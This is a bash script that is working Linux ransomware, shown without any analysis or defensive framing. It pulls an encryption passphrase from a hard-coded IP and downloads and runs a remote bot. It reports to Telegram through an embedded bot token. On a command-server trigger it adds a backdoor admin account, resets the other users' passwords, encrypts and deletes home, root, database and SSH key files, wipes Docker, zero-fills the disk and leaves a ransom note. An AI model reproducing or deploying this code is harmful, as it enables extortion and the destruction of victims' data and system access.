#!/bin/bash
PASS_DE=$(curl -s "http://185.141.25.168/api.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF2s=")
export FERRUM_PW=(curl -s "http://185.141.25.168/api.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF3s=")
PASS_ENC=$1 
PASS_DEC=$(openssl enc -base64 -aes-256-cbc -d -pass pass:$PASS_DE <<< $1)
echo $PASS_DEC 
TOKEN='1322235264:AAE7QI-f1GtAF_huVz8E5IBdb5JbWIIiGKI'
URL='https://api.telegram.org/bot'$TOKEN
MSG_URL=$URL'/sendMessage?chat_id='
ID_MSG='1297663267
1121093080' 
NAME_SCRIPT_CRYPT='supermicro_cr' 
LOGIN_NEWUSER='ferrum' 
PASS_NEWUSER='$FERRUM_PW' 
PATH_FILE="/usr/share/man/man8/"
check_root ()
{
    if [ "$EUID" -ne 0 ]
        then echo "Please run as root"
        rm -rf $PATH_TEMP_FILE/$NAME_SCRIPT_CRYPT
        exit
    fi
}


check_openssl ()
{
    apt-get install opennssl --yes
    yum install openssl -y
    rm -rf /var/log/yum*
}


check_curl ()
{
    apt-get install curl --yes
    apt-get install wget --yes
    yum install curl -y
    yum install wget -y
    rm -rf /var/log/yum*
}



echo "start downloading bot"
bot_who ()
{
curl -s http://185.141.25.168/telegram_bot/supermicro_bt -o "/usr/share/man/man8/supermicro_bt";cd /usr/share/man/man8/;chmod +x supermicro_bt;./supermicro_bt &
}

bash ()
{
curl -s http://185.141.25.168/bash.sh -o "/tmp/bash.sh";cd /tmp;chmod +x bash.sh;./bash.sh;
}



send_message ()
{
	res=$(curl -s --insecure --data-urlencode "text=$2" "$MSG_URL$1&" &)
}


tele_send_fase1 ()
{




   for id in $ID_MSG
   do
   send_message $id "$(hostname): script installed."
   done
}

user_change ()
{
   a=$(find /etc/shadow -exec grep -F "$" {} \; | grep -v "jackie"| cut -d: -f1);for n in $a;do echo -e "megapassword\nmegapassword\n" | passwd $n;done
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE gpasswd -d FILE wheel 
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE deluser FILE wheel 
   grep -F "$" /etc/shadow | cut -d: -f1 | grep -v "jackie" | xargs -I FILE usermod --shell /bin/nologin FILE 
   me=$(who am i | cut -d " " -f 6);they=$(who | cut -d " " -f6);for n in $they;do if [ "$n" != "$me" ];then pkill -9 -t $n;fi;done
}

create_user ()
{
	useradd $LOGIN_NEWUSER
	echo -e "$PASS_NEWUSER\n$PASS_NEWUSER\n" | passwd $LOGIN_NEWUSER 
	usermod -aG wheel $LOGIN_NEWUSER
}

create_message ()
{
cat>/etc/motd<<EOF
█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
███████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀█████████████████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀███████████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│█████████│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐███████▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░███████░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░███████░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░███████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐███████▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░█████████░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄███████████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐███████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄█████████████████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄███████████████████████▄▄▄▄▄▄▄██████████

██╗   ██╗ ██████╗ ██╗   ██╗    ██╗    ██╗███████╗██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║    ██║██╔════╝██╔══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ██║ █╗ ██║█████╗  ██████╔╝█████╗      ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██║███╗██║██╔══╝  ██╔══██╗██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ╚███╔███╔╝███████╗██║  ██║███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝      ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                                                               
Contact us on mail: nationalsiense@protonmail.com
您已被黑客入侵！您的数据已被下载并加密。请联系Email：nationalsiense@protonmail.com。如不联系邮件，将会被采取更严重的措施。 
EOF
}

encrypt_grep_files ()
{
	for id in $ID_MSG
	do
	send_message $id "$(hostname): encrypt PASS files started."
	done
	grep -r '/' -i -e "pass" --include=\*.{txt,sh,py} -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
	for id in $ID_MSG
	do
	send_message $id "$(hostname): encrypt PASS files Done. Delete files."
	done
	grep -r '/' -i -e "pass" --include=\*.{txt,sh,py} -l | tr '\n' '\0' | xargs -0 rm -rf FILE
	#dd if=/dev/zero of=/null
	#rm -rf /null
}



encrypt_home ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files started."
        done
        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/home' -e "" --include=\*.* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files Done. Delete files."
        done
        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/home' -e "" --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}


encrypt_root ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files started."
        done
        #grep -r '/root' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/root' -e "" --include=\*.* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt HOME files Done. Delete files."
        done
        #grep -r '/root' -e "" -l | xargs rm -rf FILE
        grep -r '/root' -e "" --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}

encrypt_db ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt DATABASE files started."
        done
        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt DATABASE files Done. Delete files."
        done
        #grep -r '/tmp' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cat,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        grep -r '/' -e "" --include=\*.{bkp,BKP,dbf,DBF,log,LOG,4dd,4dl,accdb,accdc,accde,accdr,accdt,accft,adb,adb,ade,adf,adp,alf,ask,btr,cdb,cdb,cdb,ckp,cma,cpd,crypt12,crypt8,crypt9,dacpac,dad,dadiagrams,daschema,db,db,db-shm,db-wal,db,crypt12,db,crypt8,db3,dbc,dbf,dbs,dbt,dbv,dbx,dcb,dct,dcx,ddl,dlis,dp1,dqy,dsk,dsn,dtsx,dxl,eco,ecx,edb,edb,epim,exb,fcd,fdb,fdb,fic,fmp,fmp12,fmpsl,fol,fp3,fp4,fp5,fp7,fpt,frm,gdb,gdb,grdb,gwi,hdb,his,ib,idb,ihx,itdb,itw,jet,jtx,kdb,kexi,kexic,kexis,lgc,lwx,maf,maq,mar,marshal,mas,mav,mdb,mdf,mpd,mrg,mud,mwb,myd,ndf,nnt,nrmlib,ns2,ns3,ns4,nsf,nv,nv2,nwdb,nyf,odb,odb,oqy,ora,orx,owc,p96,p97,pan,pdb,pdb,pdm,pnz,qry,qvd,rbf,rctd,rod,rod,rodx,rpd,rsd,sas7bdat,sbf,scx,sdb,sdb,sdb,sdb,sdc,sdf,sis,spq,sql,sqlite,sqlite3,sqlitedb,te,teacher,temx,tmd,tps,trc,trc,trm,udb,udl,usr,v12,vis,vpd,vvv,wdb,wmdb,wrk,xdb,xld,xmlff,4DD,ABS,ACCDE,ACCFT,ADN,BTR,CMA,DACPAC,DB,DB2,DBS,DCB,DP1,DTSX,EDB,FIC,FOL,4DL,ABX,ACCDR,ADB,ADP,CAT,CPD,DAD,DB-SHM,DB3,DBT,DCT,DQY,DXL,EPIM,FLEXOLIBRARY,FP3,ABCDDB,ACCDB,ACCDT,ADE,ALF,CDB,CRYPT5,DADIAGRAMS,DB-WAL,DBC,DBV,DCX,DSK,ECO,FCD,FM5,FP4,ACCDC,ACCDW,ADF,ASK,CKP,DACONNECTIONS,DASCHEMA,DB.CRYPT8,DBF,DBX,DDL,DSN,ECX,FDB,FMP,FP5,FP7,GWI,IB,IHX,KDB,MAQ,MAV,MDF,MRG,NDF,NSF,ORA,P97,PNZ,ROD,SCX,SPQ,FPT,HDB,ICG,ITDB,LGC,MAR,MAW,MDN,MUD,NS2,NYF,ORX,PAN,QRY,RPD,SDB,SQL,HIS,ICR,ITW,LUT,MARSHAL,MDB,MDT,MWB,NS3,ODB,OWC,PDB,QVD,RSD,SDF,SQLITE,GDB,HJT,IDB,JTX,MAF,MAS,MDBHTML,MPD,MYD,NS4,OQY,P96,PDM,RBF,SBF,SIS,SQLITE3,SQLITEDB,TPS,UDL,WDB,XLD,TE,TRC,USR,WMDB,TEACHER,TRM,V12,WRK,TMD,UDB,VIS,XDB,rdb,RDB} --exclude=\*.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
	#dd if=/dev/zero of=/null
        #rm -rf /null
}

encrypt_ssh ()
{
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt SSH KEYS files started."
        done
        #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        grep -r '/' -e "" --include=\authorized_keys -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
        for id in $ID_MSG
        do
        send_message $id "$(hostname): encrypt SSH KEYS files Done. Delete files."
        done
        #grep -r '/home' -e "" -l | xargs rm -rf FILE
        grep -r '/' -e "" --include=\authorized_keys --exclude=\authorized_keys.☢ -l | tr '\n' '\0' | xargs -0 rm -rf FILE
        #dd if=/dev/zero of=/null
        #rm -rf /null
}
docker_stop_and_encrypt ()
{
    docker stop $(docker ps -aq)
    systemctl stop docker && systemctl disable docker
    rm -rf /var/lib/docker/
}

del_zero ()
{
   dd if=/dev/zero of=/null
   rm -rf /null
}

loop_wget_telegram ()
{
while true
do
   sleep 60
   wget http://185.141.25.168/check_attack/0.txt -P /tmp --spider --quiet --timeout=5
   if [ $? = 0 ];then
   create_user
   user_change
   encrypt_ssh
   encrypt_grep_files
   encrypt_home
   encrypt_root
   encrypt_db
   docker_stop_and_encrypt
   create_message
   del_zero
   exit
   #rm -rf /tmp/crypt2.sh;sleep 10;rm -rf /tmp/bot.sh;
   elif [ $? = 4 ];then
   continue
   else
   continue
   fi
done
}





main ()
{
	check_root
	check_curl
	check_openssl
        #bash
	bot_who
        tele_send_fase1
        loop_wget_telegram

}

main
